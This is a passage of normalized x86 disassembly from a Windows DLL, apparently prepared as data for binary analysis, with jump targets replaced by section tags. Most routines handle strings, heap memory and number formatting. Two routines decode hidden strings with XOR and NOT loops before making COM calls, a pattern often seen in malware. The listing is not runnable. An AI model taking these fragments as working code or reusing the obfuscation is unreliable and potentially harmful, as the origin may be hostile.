and [ eax + 0x70 ] 0xfffffffd
sub_1002a850
test ebx ebx
je r-xdata
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_100796a0
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x4 ] 0x0
sub_1002a890
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi ecx
call sub_10003330
xor edi edi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] ebx
mov [ esi + 0x98 ] edi
mov [ esi + 0x9c ] edi
push ebx
push 0x8
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
xor ecx ecx
cmp eax edi
setne cl
push ebx
push edx
push eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x8 ] ecx
call sub_100796a0
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002a922
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1002a990
push ebp
mov ebp esp
push 0xffffffff
push sub_10080d29
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x10 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_10035d20
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10035d20
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_100399e0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_1002aa50
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0x2c ] edx
xor eax eax
push edi
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
nop
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xe
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xf
jb r-xdata
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
mov edi [ edx + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edi [ edx + 0xc ]
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_100796a0
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] 0x0
mov edi [ edx + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x8 ] eax
call sub_100796a0
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x8 ] 0x0
mov eax [ ebp - 0x2c ]
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x18 ]
mov [ ebx + 0x18 ] ecx
mov eax [ eax + 0x20 ]
pop edi
pop esi
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea edx [ esi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0xc ] eax
call sub_100796a0
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov [ ebx + 0x20 ] eax
inc [ eax + 0x1c ]
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x1c ] eax
call sub_100796a0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x1c ] 0x0
sub_1002abe0
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10015b10
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x14
sub_1002ac40
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ecx + 0x8 ]
mov esi [ edi + 0xc ]
cmp esi [ r--data ]
je r-xdata
mov eax [ edi + 0x1c ]
xor edx edx
push ebx
cmp eax edx
je r-xdata
mov eax [ ebp + 0xc ]
push ecx
mov [ edi + 0x4 ] 0x1
call sub_100736e0
mov [ edi + 0x4 ] 0x0
mov eax [ r--data ]
add esp 0x4
mov [ edi + 0xc ] eax
pop edi
mov eax 0x1
pop esi
pop ebp
retn
lea ebx [ edi + 0x94 ]
push ebx
mov [ edi + 0x1c ] edx
call sub_1003c6e0
mov ecx [ edi ]
push ecx
mov esi eax
push esi
push r--data
call sub_1003bee0
mov eax [ ebp + 0xc ]
mov edx [ edi ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx * 4 + rw-data ]
push eax
push esi
push edi
push ecx
call edx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
je r-xdata
mov esi [ edi + 0x14 ]
add esi [ edi + 0x10 ]
cmp eax esi
jae r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] edx
movsx esi [ eax ]
mov eax [ ebp + 0xc ]
push ecx
call sub_100736e0
add esp 0x4
mov [ edi + 0x4 ] ebx
mov eax 0x1
add [ edi + 0x1c ] eax
pop ebx
pop edi
pop esi
pop ebp
retn
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
test ecx ecx
je r-xdata
push ebx
call sub_1003c6e0
mov esi eax
mov eax [ edi ]
push eax
push esi
push r--data
call sub_1003bee0
mov edx [ ebp + 0xc ]
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
push edx
push esi
push edi
push eax
call ecx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
jne r-xdata
push ebx
call sub_10032470
add esp 0x4
sub_1002ad70
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
lea eax [ eax + ecx * 4 ]
sub edx ecx
push edi
mov edi [ eax ]
lea ecx [ edx * 4 - 0x4 ]
push ecx
lea edx [ eax + 0x4 ]
push edx
push eax
call sub_10078db0
add esp 0xc
dec [ esi + 0x4 ]
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1002adc0
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x4444443
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x88888889
imul edi
add edx edi
sar edx 0x5
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_1002c5ed
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x4444444
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_10010bd0
mov eax esi
cmp eax esi
jae r-xdata
sub_1002ae40
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_10058a25
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1002ae80
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov ecx [ r--data ]
xor eax eax
push ebx
nop
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0x75
and ebx 0xff
mov [ ebp + eax * 2 - 0x10 ] bx
inc eax
cmp eax 0x4
jb r-xdata
push edx
lea ecx [ ebp - 0x10 ]
xor eax eax
push ecx
mov [ ebp - 0x8 ] ax
call sub_100283d0
add esp 0x8
pop ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x9
call sub_100050e0
push edi
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x130
call sub_100050e0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0x89
call sub_100050e0
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1002af40
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_1002af70
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi ecx
mov ecx [ r--data ]
push edi
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x8c ] ebx
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
not edx
xor edx eax
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x8c ]
push edx
mov [ ebp - 0x26 ] ax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ esi + 0x54 ] 0x8
lea eax [ esi + 0x40 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x24 ]
lea eax [ ecx + 0x11 ]
mov [ ebp - 0x14 ] cx
lea edi [ ecx - 0x2 ]
call sub_100050e0
mov ebx [ ebp - 0x14 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x8c ]
push eax
push r--data
lea eax [ ebp - 0x24 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] edi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov edi eax
mov eax [ ebp - 0x8c ]
mov edx [ eax ]
push edi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x87
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call sub_100050e0
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x78 ]
mov eax 0x3a
call sub_100050e0
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
lea edx [ ebp - 0x90 ]
push edx
mov edx [ ebp - 0x8c ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xcc
call sub_100050e0
mov [ ebp - 0x98 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x8c ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x15
call sub_100050e0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x90 ] ebx
jmp r-xdata
push edi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x98 ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1002b141
push 0x20
push r--data
call sub_10079bf0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100049c2
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10079c35
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1007b53b
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1003c405
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_10043f7b
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10029ea7
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b2a8
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1002b2f0
push ebp
mov ebp esp
push 0xffffffff
push sub_100806df
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x38 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002a500
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_1002b48f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ ebp + 0x10 ]
mov [ ecx ] 0x2a2e
add ecx 0x2
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1002b4f6
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x20
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10005213
jmp r-xdata
sub_1002b580
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10050437
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_10078db0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_1002b602
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sub edi [ ebp + 0x8 ]
sar esi 0x1
sar edi 0x1
or ebx 0xffffffff
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_10007cfe
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
call sub_10008102
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi edi
ja r-xdata
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
push edi
push eax
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0xc ]
call sub_10022837
mov ebx eax
xor eax eax
add esp 0x18
cmp ebx eax
jne r-xdata
mov ebx esi
jmp r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100796a0
add esp 0xc
jbe r-xdata
push eax
push eax
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
call sub_10022837
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
call sub_10022b5a
pop ecx
mov ecx [ ebp + 0x14 ]
movzx ecx [ eax + ecx ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 2 ] cx
inc eax
cmp eax ebx
jb r-xdata
mov ebx 0x7fffffff
jmp r-xdata
sub_1002b6c2
push 0x58
mov eax sub_1007f3ea
call sub_1001bb6b
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x64 ] ebx
call sub_1005434f
mov edi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_10051f6c
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x4a ] 0x0
jmp r-xdata
mov eax [ ebp + 0x18 ]
and eax 0xe00
push 0xa
pop edi
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_1003b7cf
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x54 ] 0x8
jmp r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10004056
neg eax
sbb eax eax
and eax edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x54 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10004056
lea eax [ ebx + 0x1 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_10066573
mov [ ebp - 0x60 ] edi
cmp [ ebp - 0x54 ] edi
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
mov [ ebx ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x54 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x60 ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_10066573
push [ ebp - 0x5c ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x60 ]
mov [ ecx ] al
movsx eax al
push eax
push r--data
call sub_10079480
add esp 0xc
test eax eax
je r-xdata
mov ecx esi
call sub_10004056
push [ ebp - 0x58 ]
and [ ebp - 0x1c ] 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
